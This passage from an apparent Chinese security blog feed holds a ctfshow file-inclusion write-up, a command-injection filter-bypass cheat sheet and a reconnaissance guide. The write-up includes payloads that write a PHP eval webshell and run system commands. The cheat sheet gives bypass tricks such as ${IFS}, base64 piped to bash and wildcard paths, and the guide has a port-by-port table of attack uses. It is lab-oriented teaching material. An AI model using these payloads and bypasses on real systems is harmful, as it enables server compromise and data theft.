class="number">2565</span>%<span class="number">253</span>d%<span class="number">2561</span>%<span class="number">252</span>e%<span class="number">2570</span>%<span class="number">2568</span>%<span class="number">2570</span></span><br><span class="line">file=php://filter/<span class="keyword">write</span>=convert.base64-decode/resource=a.php</span><br></pre></td></tr></table></figure><p>POST</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="number">11</span>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line">前面的<span class="number">11</span>是为了填充<span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span></span><br><span class="line">base64 <span class="number">4</span>位<span class="number">4</span>位解码，其中<span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>解码的内容其实只有phpdie，所以需要再填充两位。</span><br><span class="line">content=&lt;?php eval($_POST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>进入<code>a.php</code>，再post我们的<code>1=system(‘ls’);</code>查看目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：1=system(&#x27;tac fl0g.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736083.png" alt="chrome_eQ5K10hkbg"></p><p>过滤了</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|php|~|!|@|#|$|%|^|&amp;|*|\|-|_|+|\=|.|</span><br></pre></td></tr></table></figure><p>发现data伪协议没有被过滤，过滤了加号和等号，所以要注意base64字符串后等号去掉</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:<span class="comment">//text/plain;base64, PD9waHAgc3lzdGVtKCdiYXNlNjQgZmwwZy5waHAnKTsgPz4</span></span><br></pre></td></tr></table></figure><h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736084.png" alt="chrome_NDZhItuQhJ"></p><p>下载下来视频，然后用010editor可以看到里面有一张图片，提取出来发现源码，是一个文件包含。</p><p>过滤了很多协议和编码方式，但是并不影响，看到<code>file_get_contents</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：file=flag.php</span><br></pre></td></tr></table></figure><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736085.png" alt="chrome_Dor05gRGjI"></p><p>题目中过滤了很多协议和编码方式，用其他的编码方式来绕过</p><p>payload:</p><p>GET</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br></pre></td></tr></table></figure><p>POST</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br></pre></td></tr></table></figure><p>进入<code>a.php</code>，再post我们的<code>1=system(‘ls’);</code>查看目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ctfshow-文件包含&quot;&gt;&lt;a href=&quot;#ctfshow-文件包含&quot; class=&quot;headerlink&quot; title=&quot;ctfshow.文件包含&quot;&gt;&lt;/a&gt;ctfshow.文件包含&lt;/h1&gt;&lt;h2 id=&quot;web78&quot;&gt;&lt;a href=&quot;#web78&quot; class=&quot;headerlink&quot; title=&quot;web78&quot;&gt;&lt;/a&gt;web78&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/yun421/picgo/raw/master/img/202203041736077.png&quot; alt=&quot;chrome_gPlSkedlQV&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;filter伪协议&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;payload：file=php://filter/convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>命令执行绕过小技巧</title>
    <link href="http://yun421.top/2021/11/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://yun421.top/2021/11/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2021-11-19T02:42:42.000Z</published>
    <updated>2021-11-19T04:11:58.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行绕过小技巧"><a href="#命令执行绕过小技巧" class="headerlink" title="命令执行绕过小技巧"></a>命令执行绕过小技巧</h1><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h3 id="windows-下"><a href="#windows-下" class="headerlink" title="windows 下"></a>windows 下</h3><blockquote><p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p></blockquote><h3 id="Linux-下"><a href="#Linux-下" class="headerlink" title="Linux 下"></a>Linux 下</h3><blockquote><p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p></blockquote><hr><span id="more"></span><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line">%09(需要php环境)</span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$9</span></span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure></blockquote><hr><h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line"><span class="built_in">exec</span>()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure><hr><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>拼接</p><blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br></pre></td></tr></table></figure></blockquote><p>base64编码</p><blockquote><p><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</code> (在bash被过滤的情况下可尝试sh)</p></blockquote><p>单引号、双引号</p><blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="comment">&#x27;&#x27;ag</span></span><br></pre></td></tr></table></figure></blockquote><p>反斜线</p><blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure></blockquote><p>正则 (假设/bin/cat: test: 是一个目录)</p><blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/???/?[a][t] ?<span class="comment">&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;`</span></span><br><span class="line">/???/?at ????`</span><br><span class="line">/???/?[a]<span class="comment">&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$1、$2等和$@</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$#</span> 是传给脚本的参数个数</span><br><span class="line"><span class="variable">$0</span> 是脚本本身的名字</span><br><span class="line"><span class="variable">$1</span> 是传递给该shell脚本的第一个参数</span><br><span class="line"><span class="variable">$2</span> 是传递给该shell脚本的第二个参数</span><br><span class="line"><span class="variable">$@</span> 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure><hr><h1 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h1><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>grep<br>1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：<br>grep test *file<br>strings</p></blockquote><h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><blockquote><p>cat$IFS$9<code>ls</code></p><p>cat$IFS$9$(ls)</p></blockquote><p>(内联，就是将``或$()内命令的输出作为输入执行)</p><hr><h1 id="利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过"><a href="#利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="headerlink" title="利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)"></a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h1><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# echo <span class="string">&quot;flag&#123;hahaha&#125;&quot;</span> &gt; flag.txt</span><br><span class="line">root@kali:~/桌面# touch <span class="string">&quot;ag&quot;</span></span><br><span class="line">root@kali:~/桌面# touch <span class="string">&quot;fl\\&quot;</span></span><br><span class="line">root@kali:~/桌面# touch <span class="string">&quot;t \\&quot;</span></span><br><span class="line">root@kali:~/桌面# touch <span class="string">&quot;ca\\&quot;</span></span><br><span class="line">root@kali:~/桌面# ls -t</span><br><span class="line"><span class="comment">&#x27;ca\&#x27;  &#x27;t \&#x27;  &#x27;fl\&#x27;   ag   flag</span></span><br><span class="line">root@kali:~/桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~/桌面# sh a</span><br><span class="line">a: <span class="number">1</span>: a: <span class="keyword">not</span> found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: <span class="number">6</span>: flag.txt: <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><blockquote><p><code>\</code>是指换行<br><code>ls -t</code>将文件按时间排序输出<br><code>sh</code>命令可以从一个文件中读取命令来执行</p></blockquote><p>PS:搬运Npfs师傅<a href="https://www.cnblogs.com/NPFS/p/13279815.html%EF%BC%8C%E5%A6%82%E6%9C%89%E4%BE%B5%E6%9D%83%EF%BC%8C%E7%AB%8B%E5%8D%B3%E5%88%A0%E9%99%A4%EF%BC%81">https://www.cnblogs.com/NPFS/p/13279815.html，如有侵权，立即删除！</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;命令执行绕过小技巧&quot;&gt;&lt;a href=&quot;#命令执行绕过小技巧&quot; class=&quot;headerlink&quot; title=&quot;命令执行绕过小技巧&quot;&gt;&lt;/a&gt;命令执行绕过小技巧&lt;/h1&gt;&lt;h1 id=&quot;管道符&quot;&gt;&lt;a href=&quot;#管道符&quot; class=&quot;headerlink&quot; title=&quot;管道符&quot;&gt;&lt;/a&gt;管道符&lt;/h1&gt;&lt;h3 id=&quot;windows-下&quot;&gt;&lt;a href=&quot;#windows-下&quot; class=&quot;headerlink&quot; title=&quot;windows 下&quot;&gt;&lt;/a&gt;windows 下&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;|&lt;/code&gt;直接执行后面的语句&lt;br&gt;&lt;code&gt;||&lt;/code&gt;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句&lt;br&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;前面和后面命令都要执行，无论前面真假&lt;br&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Linux-下&quot;&gt;&lt;a href=&quot;#Linux-下&quot; class=&quot;headerlink&quot; title=&quot;Linux 下&quot;&gt;&lt;/a&gt;Linux 下&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;;&lt;/code&gt;前面和后面命令都要执行，无论前面真假&lt;br&gt;&lt;code&gt;|&lt;/code&gt;直接执行后面的语句&lt;br&gt;&lt;code&gt;||&lt;/code&gt;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句&lt;br&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;前面和后面命令都要执行，无论前面真假&lt;br&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://yun421.top/2021/10/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yun421.top/2021/10/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-10-16T07:13:08.000Z</published>
    <updated>2022-03-04T09:33:32.699Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><h3 id="1-Google-hacking"><a href="#1-Google-hacking" class="headerlink" title="1.Google hacking"></a>1.Google hacking</h3><p><strong>常用搜索语法：</strong><br><strong>intitle:KEYWORD //搜索网页标题中含有关键词的网页</strong><br><strong>intext:KEYWORD //搜索站点正文中含有关键词的网页</strong><br><strong>inurl:KEYWORD //搜索URL中包含有指定字符串的网址</strong><br><strong>inurl:php?id= //搜索PHP网页</strong><br><strong>site:DOMAIN //在指定站点内查找相关的内容</strong><br><strong>filetype:FILE //搜索指定类型的文件</strong></p><p><strong>我们可以同时附加多个条件进行筛选，比如 inurl:admin intitle:农具</strong><br><strong>两个筛选条件之间用空格隔开</strong></p><span id="more"></span><h3 id="2-Shodan-https-www-shodan-io"><a href="#2-Shodan-https-www-shodan-io" class="headerlink" title="2.Shodan https://www.shodan.io/"></a>2.Shodan <a href="https://www.shodan.io/">https://www.shodan.io/</a></h3><p><strong>Shodan与Google这种搜索网址的搜索引擎不同的是，Shodan是用来搜索网络空间中在线设备的。</strong></p><h3 id="3-Zoomeye（钟馗之眼）https-www-zoomeye-org"><a href="#3-Zoomeye（钟馗之眼）https-www-zoomeye-org" class="headerlink" title="3.Zoomeye（钟馗之眼）https://www.zoomeye.org/"></a>3.Zoomeye（钟馗之眼）<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></h3><p><strong>ZoomEye是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。</strong></p><p><strong>搜索语法</strong><br><strong>1、app:nginx　　组件名</strong><br><strong>2、ver:1.0　　版本</strong><br><strong>3、os:windows　　操作系统</strong><br><strong>4、country:”China”　　国家</strong><br><strong>5、city:”hangzhou”　　城市</strong><br><strong>6、port:80　　端口</strong><br><strong>7、hostname:google　　主机名</strong><br><strong>8、site:thief.one　　网站域名</strong><br><strong>9、desc:nmask　　描述</strong><br><strong>10、keywords:nmask’blog　　关键词</strong><br><strong>11、service:ftp　　服务类型</strong><br><strong>12、ip:8.8.8.8　　ip地址</strong><br><strong>13、cidr:8.8.8.8/24　　ip地址段</strong></p><p><strong>通过以上不同种类的搜索引擎我们可以获得相当多的有用的信息，甚至平时搜索东西我们也可以通过zoomeye来找到自己想要的东西</strong></p><h2 id="企业信息"><a href="#企业信息" class="headerlink" title="企业信息"></a>企业信息</h2><h3 id="1-天眼查https-www-tianyancha-com"><a href="#1-天眼查https-www-tianyancha-com" class="headerlink" title="1.天眼查https://www.tianyancha.com/"></a>1.天眼查<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></h3><p><strong>天眼查是一款“都能用的商业安全工具”，根据用户的不同需求，实现了企业背景、企业发展、司法风险、经营风险、经营状况、知识产权方面等多种数据维度的检索。</strong></p><h3 id="2-企业信用信息公示系统http-www-gsxt-gov-cn"><a href="#2-企业信用信息公示系统http-www-gsxt-gov-cn" class="headerlink" title="2.企业信用信息公示系统http://www.gsxt.gov.cn/"></a>2.企业信用信息公示系统<a href="http://www.gsxt.gov.cn/">http://www.gsxt.gov.cn/</a></h3><h3 id="3-工业和信息化部ICP-IP地址-域名信息备案管理系统https-beian-miit-gov-cn"><a href="#3-工业和信息化部ICP-IP地址-域名信息备案管理系统https-beian-miit-gov-cn" class="headerlink" title="3.工业和信息化部ICP/IP地址/域名信息备案管理系统https://beian.miit.gov.cn/"></a>3.工业和信息化部ICP/IP地址/域名信息备案管理系统<a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></h3><p><strong>以上几个可以用来深入了解渗透目标网站所属企业的相关信息</strong></p><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><p><strong>whois 是用来查询域名的IP以及所有者等信息的传输协议。</strong><br><strong>whois信息可以获取关键注册人的信息，包括注册商、联系人、联系邮箱、联系电话、创建时间等,可以进行邮箱反查域名，爆破邮箱，社工，域名劫持，寻找旁站等等。</strong><br><strong>常用的工具有：</strong></p><p><strong>站长工具<a href="https://tool.chinaz.com/">https://tool.chinaz.com/</a></strong></p><p><strong>爱站<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></strong></p><p><strong>微步在线<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></strong></p><h2 id="Nslookup的用法"><a href="#Nslookup的用法" class="headerlink" title="Nslookup的用法"></a>Nslookup的用法</h2><p><strong>例如：</strong><br><strong>1.设置类型为ns</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041731605.png" alt="image-20220304173102536"></p><p><strong>2.下面的例子查询baidu.com使用的DNS服务器名称:</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041731753.png" alt="image-20220304173128706"></p><p><strong>3.下面的例子展示如何查询baidu.com的邮件交换记录：</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041732775.png" alt="image-20220304173212727"></p><p><strong>4.查看网站cname值。</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041732118.png" alt="image-20220304173242068"></p><p><strong>5.查看邮件服务器记录（-qt=MX）</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041733735.png" alt="image-20220304173321688"></p><p><strong>6.同样nslookup也可以验证是否存在域传送漏洞，步骤如下：</strong></p><p>1.nslookup进入交互式模式<br>2.Server 设置使用的DNS服务器<br>3.ls命令列出某个域中的所有域名</p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p><strong>子域名收集可以发现更多渗透测试范围内的域名/子域名，以增加漏洞发现机率；探测到更多隐藏或遗忘的应用服务，这些应用往往可导致一些严重漏洞。</strong><br><strong>常用的工具有：子域名挖掘机Layer、subDomainsBrute、Dnsenum、Dnsmap</strong> </p><p><strong>这里推荐一个在线收集子域名的网站 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></strong> </p><h2 id="真实IP获取"><a href="#真实IP获取" class="headerlink" title="真实IP获取"></a>真实IP获取</h2><p>现在大多数的网站都开启了CDN加速，导致我们获取到的IP地址不一定是真实的IP地址。<br>CDN是内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。<br><strong>如果想获取真实IP，我们可以使用以下几种方法</strong></p><h3 id="1-多地Ping法："><a href="#1-多地Ping法：" class="headerlink" title="1.多地Ping法："></a>1.多地Ping法：</h3><p><strong>由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。</strong></p><p><strong>这里推荐一个网站可以多个地点ping服务器，<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></strong></p><h3 id="2-二级域名法："><a href="#2-二级域名法：" class="headerlink" title="2.二级域名法："></a><strong>2.二级域名法：</strong></h3><p><strong>目标站点一般不会把所有的二级域名放cdn上。通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</strong></p><h3 id="3-nslookup法："><a href="#3-nslookup法：" class="headerlink" title="3.nslookup法："></a><strong>3.nslookup法：</strong></h3><p><strong>找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。</strong></p><h3 id="4-Ping法："><a href="#4-Ping法：" class="headerlink" title="4.Ping法："></a><strong>4.Ping法：</strong></h3><p><strong>直接ping example.com而不是<a href="http://www.example.com,因为现有很多cdn厂商基本只要求把www.example.com/">www.example.com，因为现有很多CDN厂商基本只要求把www.example.com</a> cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。</strong></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p><strong>通过识别目标网站所使用的操作系统、CMS、服务器与中间件信息，可以帮助我们进一步了解渗透测试环境，可以利用已知的一些CMS漏洞或中间件漏洞来进行攻击。</strong></p><h3 id="1-可以在以下地方获取信息："><a href="#1-可以在以下地方获取信息：" class="headerlink" title="1.可以在以下地方获取信息："></a>1.可以在以下地方获取信息：</h3><p><strong>1.指定路径下指定名称的js文件或代码。</strong></p><p><strong>2.指定路径下指定名称的css文件或代码。</strong></p><p><strong>3.<title>中的内容，有些程序标题中会带有程序标识，但不是很多。</title></strong></p><p><strong>4.meta标记中带程序标识<meta name="description"><meta name="keywords"><meta name="generator"><meta name="author"><meta name="copyright"></strong></p><p><strong>5.display:none中的版权信息。</strong></p><p><strong>6.页面底部版权信息，关键字© Powered by等。</strong></p><p><strong>7.readme.txt、License.txt、help.txt等文件。</strong></p><p><strong>8.指定路径下指定图片文件，如一些小的图标文件，后台登录页面中的图标文件</strong><br><strong>等，一般管理员不会修改它们。</strong></p><p><strong>9.注释掉的html代码中&lt;!–</strong></p><p><strong>10.http头的X-Powered-By中的值，有的应用程序框架会在此值输出。</strong></p><p><strong>11.cookie中的关键字</strong></p><p><strong>12.robots.txt文件中的关键字</strong><br><strong>robots.txt 中禁止的路径很可能说明站点就有这些路径 而且robots.txt 多是可访问的</strong></p><p><strong>13.404页面</strong></p><p><strong>14.302返回时的旗标</strong></p><h3 id="2-大小写"><a href="#2-大小写" class="headerlink" title="2.大小写"></a>2.大小写</h3><p><strong>访问网站：</strong><br><strong><a href="http://www.xxx.com/index.html">http://www.xxx.com/index.html</a></strong><br><strong><a href="http://www.xxx.com/inDex.html">http://www.xxx.com/inDex.html</a></strong><br><strong>Windows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。</strong></p><p><strong>工具 ：云悉指纹、Whatweb、httprint、Bugscanner、浏览器插件 wappalyzer</strong></p><p><strong>有的时候HTTP返回报文的server也可能泄露相关信息</strong></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>扫描端口可以使用Nmap，masscan进行扫描探测，尽可能多的搜集开启的端口好已经对应的服务版本，得到确切的服务版本后可以搜索有没有对应版本的漏洞。<br>常见的端口信息及渗透方法：</p><table><thead><tr><th>端口</th><th>服务</th><th>渗透用途</th></tr></thead><tbody><tr><td>tcp 20,21 FTP</td><td>FTP</td><td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td></tr><tr><td>tcp 22</td><td>SSH</td><td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet</td><td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP</td><td>邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td></tr><tr><td>tcp/udp 53</td><td>DNS</td><td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td></tr><tr><td>tcp/udp 69</td><td>TFTP</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80-89,443,8440-8450,8080-8089</td><td>各种常用的Web服务端口</td><td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td></tr><tr><td>tcp 110</td><td>POP3</td><td>可尝试爆破,嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>Samba</td><td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td></tr><tr><td>tcp 143</td><td>IMAP</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP</td><td>爆破默认团队字符串,搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP</td><td>ldap注入,允许匿名访问,弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec</td><td>可爆破,rlogin登陆</td></tr><tr><td>tcp 873</td><td>Rsync</td><td>匿名访问,文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN</td><td>想办法钓VPN账号,进内网</td></tr><tr><td>tcp 1352</td><td>Lotus</td><td>弱口令,信息泄漏,爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server</td><td>注入,提权,sa弱口令,爆破</td></tr><tr><td>tcp 1521</td><td>Oracle</td><td>tns爆破,注入,弹shell…</td></tr><tr><td>tcp 1500</td><td>ISPmanager</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP</td><td>爆破,想办法钓VPN账号,进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra</td><td>默认密码zerbra</td></tr><tr><td>tcp 3128</td><td>Squid</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL</td><td>注入,提权,爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp shift</td><td>后门[需要03以下的系统],爆破,ms12-020</td></tr><tr><td>tcp 